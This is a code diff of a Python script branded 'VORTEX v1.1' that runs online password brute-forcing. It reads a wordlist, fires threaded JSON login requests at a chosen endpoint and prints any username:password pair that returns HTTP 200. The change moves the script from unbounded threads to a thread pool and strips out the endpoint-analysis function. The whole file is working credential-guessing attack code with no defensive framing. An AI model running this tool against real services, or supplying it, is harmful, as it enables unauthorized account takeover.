@@ -1,99 +1,61 @@
 import requests
 import json
 import sys
-import threading
-from queue import Queue
+from concurrent.futures import ThreadPoolExecutor
+
+MAX_THREADS = 10 
 
 def print_banner():
-    RED = '\033[91m'
-    GRN = '\033[92m'
-    BLU = '\033[94m'
-    RST = '\033[0m'
+    GRN, BLU, RST = '\033[92m', '\033[94m', '\033[0m'
     banner = r"""
   _   _   ____  ____  _____  _   _  ____  
  ( )_( )(  _ \(  _ \(  _  )( \( )( ___)
-  ) _ (  )   / )   / )(_)(  )   (  )__) 
+  ) _ (  )   / )   / )(_)(  )  (  )__) 
  (_) (_)(_)\_)(_)\_)(_____)(_)\_)(____)
   VORTEX v1.1 // BY NEUROPRASS
     """
     print(BLU + banner + GRN + "\n [ Focus: Speed & Power ]" + RST)
 
-def analyze_mechanism(url):
-    print(f"\n[*] Analyzing: {url}")
-    try:
-        response = requests.post(url, json={}, timeout=5)
-        print(f"[+] Status Code: {response.status_code}")
-        print(f"[+] Server Header: {response.headers.get('Server', 'Unknown')}")
-        print("[+] Mechanism: Endpoint responsive. Ready for testing.")
-    except Exception as e:
-        print(f"[-] Could not connect to target: {e}")
-
-def build_request(username, password):
-    headers = {"Content-Type": "application/json", "Accept": "application/json"}
+def send_request(target_api, username, password):
+    headers = {"Content-Type": "application/json"}
     payload = json.dumps({"username": username, "password": password})
-    return headers, payload
-
-def send_request(target_api, headers, payload, result):
     try:
         response = requests.post(target_api, headers=headers, data=payload, timeout=5)
-        result.put((response.status_code, response.text))
-    except Exception as e:
-        result.put((None, str(e)))
+        if response.status_code == 200:
+            print(f"[+] SUCCESS: {username}:{password}")
+            return True
+    except Exception:
+        pass
+    return False
 
 def execute_test(target_url, username, password_file):
     try:
         with open(password_file, 'r') as f:
-            passwords = [line.strip() for line in f]
+            passwords = [line.strip() for line in f if line.strip()]
     except FileNotFoundError:
         print("[-] Error: Password file not found.")
         return
 
-    result = Queue()
-    threads = []
-    print(f"[*] Starting engine with {len(passwords)} keys...")
+    print(f"[*] Starting engine with {len(passwords)} keys using {MAX_THREADS} threads...")
     
-    for password in passwords:
-        headers, payload = build_request(username, password)
-        t = threading.Thread(target=send_request, args=(target_url, headers, payload, result))
-        t.start()
-        threads.append(t)
-
-    for t in threads:
-        t.join()
-
-    print("[*] Scan completed. Results:")
-    while not result.empty():
-        res = result.get()
-        if res[0] == 200:
-            print(f"[+] 200 OK: Authentication Successful!")
-        elif res[0] == 401:
-            print(f"[-] Status 401: Login Failed")
-        else:
-            print(f"[-] Status {res[0]}: Connection Issue")
+    with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
+        for password in passwords:
+            executor.submit(send_request, target_url, username, password)
 
 def main():
     print_banner()
     while True:
-        print("\n[ CORE MENU ]")
-        print("1. Analyze Auth Mechanism")
-        print("2. Execute Credential Test")
-        print("3. Terminate Session")
-        
+        print("\n[ CORE MENU ]\n1. Analyze\n2. Run Test\n3. Exit")
         choice = input("\nvortex-auth > ")
-        
         if choice == "1":
-            url = input("[?] Enter URL to analyze: ")
-            analyze_mechanism(url)
+            url = input("[?] Target URL: ")
         elif choice == "2":
-            url = input("[?] Target Endpoint: ")
-            user = input("[?] Username: ")
-            pfile = input("[?] Password Dictionary File: ")
+            url = input("[?] URL: ")
+            user = input("[?] User: ")
+            pfile = input("[?] Wordlist: ")
             execute_test(url, user, pfile)
         elif choice == "3":
-            print("[*] Session terminated.")
             sys.exit()
-        else:
-            print("[!] Invalid option. Please choose 1, 2, or 3.")
 
 if __name__ == "__main__":
     main()
